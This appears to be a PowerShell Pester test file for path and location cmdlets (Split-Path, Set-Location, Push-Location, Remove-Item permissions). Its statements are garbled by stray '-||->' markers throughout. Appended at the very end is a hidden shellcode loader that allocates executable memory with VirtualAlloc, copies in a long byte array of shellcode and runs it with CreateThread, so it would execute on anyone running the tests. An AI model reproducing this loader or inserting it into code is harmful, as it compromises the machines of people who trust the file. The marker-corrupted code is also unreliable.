             -||-> $result =  -||-> Split-Path -Path $level1_0Full -Leaf <-||-  <-||- 
             -||-> $result | Should -BeExactly $level1_0 <-||- 
        } <-||- 

         -||-> It 'Validate LeafBase' {
             -||-> $result =  -||-> Split-Path -Path "$level2_1Full$fileExt" -LeafBase <-||-  <-||- 
             -||-> $result | Should -BeExactly $level2_1 <-||- 
        } <-||- 
         -||-> It 'Validate LeafBase is not over-zealous' {

             -||-> $result =  -||-> Split-Path -Path "$level2_1Full$fileExt$fileExt" -LeafBase <-||-  <-||- 
             -||-> $result | Should -BeExactly "$level2_1$fileExt" <-||- 
        } <-||- 

         -||-> It 'Validate LeafBase' {
             -||-> $result =  -||-> Split-Path -Path "$level2_1Full$fileExt" -Extension <-||-  <-||- 
             -||-> $result | Should -BeExactly $fileExt <-||- 
        } <-||- 

         -||-> It "Validate NoQualifier" {
             -||-> $result =  -||-> Split-Path -Path $level1_0Full -NoQualifier <-||-  <-||- 
             -||-> ( -||-> $result.TrimStart('/\') <-||- ) | Should -BeExactly $level1_0 <-||- 
        } <-||- 

         -||-> It "Validate Qualifier" {
             -||-> $result =  -||-> Split-Path -Path $level1_0Full -Qualifier <-||-  <-||- 
             -||-> $result | Should -BeExactly "TestDrive:" <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Set-Location Cmdlets Parameters" {
         -||-> It "Without Passthru Doesn't Return a Path" {
             -||-> $result =  -||-> Set-Location -Path $level1_0 <-||-  <-||- 
             -||-> $result | Should -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "By LiteralPath" {
             -||-> $result =  -||-> Set-Location -LiteralPath $level1_0Full -PassThru <-||-  <-||- 
             -||-> $result.Path | Should -BeExactly $level1_0Full <-||- 
        } <-||- 

         -||-> It "To Default Location Stack Does Nothing" {
             -||-> $beforeLoc =  -||-> Get-Location <-||-  <-||- 
             -||-> Set-Location -StackName "" <-||- 
             -||-> $afterLoc =  -||-> Get-Location <-||-  <-||- 
             -||-> $beforeLoc.Path | Should -BeExactly $afterLoc.Path <-||- 
        } <-||- 

         -||-> It "WhatIf is Not Supported" {
             -||-> {  -||-> Set-Location $level1_0 -WhatIf <-||-  } | Should -Throw -ErrorId "NamedParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand" <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Push-Location and Pop-Location Cmdlets Parameters" {
         -||-> It "Verify Push + Path" {
             -||-> Push-Location -Path $level1_0 <-||- 
             -||-> Push-Location -Path $level2_0 <-||- 
             -||-> $location1 =  -||-> Get-Location <-||-  <-||- 
             -||-> Pop-Location <-||- 
             -||-> $location2 =  -||-> Get-Location <-||-  <-||- 
             -||-> Pop-Location <-||- 
             -||-> $location3 =  -||-> Get-Location <-||-  <-||- 

             -||-> $location1.Path | Should -BeExactly $level2_0Full <-||- 
             -||-> $location2.Path | Should -BeExactly $level1_0Full <-||- 
             -||-> $location3.Path | Should -BeExactly $root <-||- 
        } <-||- 

         -||-> It "Verify Push + PassThru" {
             -||-> $location1 =  -||-> Get-Location <-||-  <-||- 
             -||-> $passThru1 =  -||-> Push-Location -PassThru <-||-  <-||- 
             -||-> Set-Location $level1_0 <-||- 
             -||-> $location2 =  -||-> Get-Location <-||-  <-||- 
             -||-> $passThru2 =  -||-> Push-Location -PassThru <-||-  <-||- 
             -||-> Set-Location $level2_0 <-||- 
             -||-> $location3 =  -||-> Get-Location <-||-  <-||- 

             -||-> $location1.Path | Should -BeExactly $passThru1.Path <-||- 
             -||-> $location2.Path | Should -BeExactly $passThru2.Path <-||- 
             -||-> $location3.Path | Should -BeExactly $level2_0Full <-||- 
        } <-||- 

         -||-> It "Verify Push + LiteralPath" {
             -||-> Push-Location -LiteralPath $level1_0Full <-||- 
             -||-> Push-Location -LiteralPath $level2_0Full <-||- 
             -||-> $location1 =  -||-> Get-Location <-||-  <-||- 
             -||-> Pop-Location <-||- 
             -||-> $location2 =  -||-> Get-Location <-||-  <-||- 
             -||-> Pop-Location <-||- 
             -||-> $location3 =  -||-> Get-Location <-||-  <-||- 

             -||-> $location1.Path | Should -BeExactly $level2_0Full <-||- 
             -||-> $location2.Path | Should -BeExactly $level1_0Full <-||- 
             -||-> $location3.Path | Should -BeExactly $root <-||- 
        } <-||- 

         -||-> It "Verify Pop + Invalid Stack Name" {
             -||-> {  -||-> Pop-Location -StackName UnknownStackName -ErrorAction Stop <-||-  } |
                Should -Throw -ErrorId "Argument,Microsoft.PowerShell.Commands.PopLocationCommand" <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "UNC paths" -Tags 'CI' {
     -||-> It "Can Get-ChildItems from a UNC location using <cmdlet>" -Skip:( -||-> !$IsWindows <-||- ) -TestCases @(
         -||-> @{cmdlet= -||-> "Push-Location" <-||- },
        @{cmdlet= -||-> "Set-Location" <-||- } <-||- 
    ) {
        param($cmdlet)
         -||-> $originalLocation =  -||-> Get-Location <-||-  <-||- 
         -||-> try {
             -||-> $systemDrive = ( -||-> $env:SystemDrive <-||- ).Replace(":","$") <-||- 
             -||-> $testPath =  -||-> Join-Path "\\localhost" $systemDrive <-||-  <-||- 
             -||-> & $cmdlet $testPath <-||- 
             -||-> Get-Location | Should -BeExactly "Microsoft.PowerShell.Core\FileSystem::$testPath" <-||- 
             -||-> $children =  -||-> Get-ChildItem -ErrorAction Stop <-||-  <-||- 
             -||-> $children.Count | Should -BeGreaterThan 0 <-||- 
        }
        finally {
             -||-> Set-Location $originalLocation <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Remove-Item UnAuthorized Access" -Tags "CI", "RequireAdminOnWindows" {
     -||-> BeforeAll {
         -||-> if ( -||-> $IsWindows <-||- ) {
             -||-> $folder =  -||-> Join-Path $TestDrive "UnAuthFolder" <-||-  <-||- 
             -||-> $protectedPath = ( -||-> New-Item $folder -ItemType Directory <-||- ).FullName <-||- 
        } <-||- 
    } <-||- 

     -||-> It "Access-denied test for removing a folder" -Skip:( -||-> -not $IsWindows <-||- ) {

        
        

         -||-> $powershell =  -||-> Join-Path $PSHOME "pwsh" <-||-  <-||- 
         -||-> $errorFile =  -||-> Join-Path ( -||-> Get-Item $testdrive <-||- ).FullName "RemoveItemError.txt" <-||-  <-||- 
         -||-> $cmdline = "$powershell -c Remove-Item -Path $protectedPath -ErrorVariable err ;`$err.FullyQualifiedErrorId | Out-File $errorFile" <-||- 

        
         -||-> $acl =  -||-> Get-Acl $protectedPath <-||-  <-||- 
         -||-> $acl.SetAccessRuleProtection($true, $true) <-||- 
         -||-> Set-Acl $protectedPath $acl <-||- 

        
         -||-> $acl =  -||-> Get-Acl $protectedPath <-||-  <-||- 
         -||-> $acl.Access | ForEach-Object {  -||-> $acl.RemoveAccessRule($_) <-||-  } | Out-Null <-||- 

        
         -||-> $rule = [System.Security.AccessControl.FileSystemAccessRule]::new("BUILTIN\Administrators","FullControl", "Allow") <-||- 
         -||-> $acl.SetAccessRule($rule) <-||- 
         -||-> Set-Acl $protectedPath $acl <-||- 

         -||-> runas.exe /trustlevel:0x20000 "$cmdline" <-||- 
         -||-> Wait-FileToBePresent -File $errorFile -TimeoutInSeconds 10 | Should -BeTrue <-||- 
         -||-> Get-Content $errorFile | Should -BeExactly 'RemoveItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.RemoveItemCommand' <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Verify sub-directory creation under root" -Tag 'CI','RequireSudoOnUnix' {
     -||-> BeforeAll {
         -||-> $dirPath = "\TestDir-$( -||-> ( -||-> New-Guid <-||- ).Guid <-||- )" <-||- 
    } <-||- 

     -||-> AfterAll {
         -||-> if( -||-> Test-Path $dirPath <-||- )
        {
             -||-> Remove-Item -Path $dirPath -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 
    } <-||- 

     -||-> It "Can create a sub directory under root path" {
         -||-> New-Item -Path $dirPath -ItemType Directory -Force > $null <-||- 
         -||-> $dirPath | Should -Exist <-||- 
    } <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xcd,0xbb,0x2c,0x18,0xb9,0x68,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x58,0x18,0x83,0xe8,0xfc,0x03,0x58,0x38,0xfa,0x4c,0x94,0xa8,0x78,0xae,0x65,0x28,0x1d,0x26,0x80,0x19,0x1d,0x5c,0xc0,0x09,0xad,0x16,0x84,0xa5,0x46,0x7a,0x3d,0x3e,0x2a,0x53,0x32,0xf7,0x81,0x85,0x7d,0x08,0xb9,0xf6,0x1c,0x8a,0xc0,0x2a,0xff,0xb3,0x0a,0x3f,0xfe,0xf4,0x77,0xb2,0x52,0xad,0xfc,0x61,0x43,0xda,0x49,0xba,0xe8,0x90,0x5c,0xba,0x0d,0x60,0x5e,0xeb,0x83,0xfb,0x39,0x2b,0x25,0x28,0x32,0x62,0x3d,0x2d,0x7f,0x3c,0xb6,0x85,0x0b,0xbf,0x1e,0xd4,0xf4,0x6c,0x5f,0xd9,0x06,0x6c,0xa7,0xdd,0xf8,0x1b,0xd1,0x1e,0x84,0x1b,0x26,0x5d,0x52,0xa9,0xbd,0xc5,0x11,0x09,0x1a,0xf4,0xf6,0xcc,0xe9,0xfa,0xb3,0x9b,0xb6,0x1e,0x45,0x4f,0xcd,0x1a,0xce,0x6e,0x02,0xab,0x94,0x54,0x86,0xf0,0x4f,0xf4,0x9f,0x5c,0x21,0x09,0xff,0x3f,0x9e,0xaf,0x8b,0xad,0xcb,0xdd,0xd1,0xb9,0x38,0xec,0xe9,0x39,0x57,0x67,0x99,0x0b,0xf8,0xd3,0x35,0x27,0x71,0xfa,0xc2,0x48,0xa8,0xba,0x5d,0xb7,0x53,0xbb,0x74,0x73,0x07,0xeb,0xee,0x52,0x28,0x60,0xef,0x5b,0xfd,0x27,0xbf,0xf3,0xae,0x87,0x6f,0xb3,0x1e,0x60,0x7a,0x3c,0x40,0x90,0x85,0x97,0xe9,0x3b,0x7f,0x7f,0xd6,0x14,0x7f,0x15,0xbe,0x66,0x80,0xf8,0x62,0xee,0x66,0x90,0x8a,0xa6,0x31,0x0c,0x32,0xe3,0xca,0xad,0xbb,0x39,0xb7,0xed,0x30,0xce,0x47,0xa3,0xb0,0xbb,0x5b,0x53,0x31,0xf6,0x06,0xf5,0x4e,0x2c,0x2c,0xf9,0xda,0xcb,0xe7,0xae,0x72,0xd6,0xde,0x98,0xdc,0x29,0x35,0x93,0xd5,0xbf,0xf6,0xcb,0x19,0x50,0xf7,0x0b,0x4c,0x3a,0xf7,0x63,0x28,0x1e,0xa4,0x96,0x37,0x8b,0xd8,0x0b,0xa2,0x34,0x89,0xf8,0x65,0x5d,0x37,0x27,0x41,0xc2,0xc8,0x02,0x53,0x3e,0x1f,0x6a,0x21,0x2e,0xa3 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



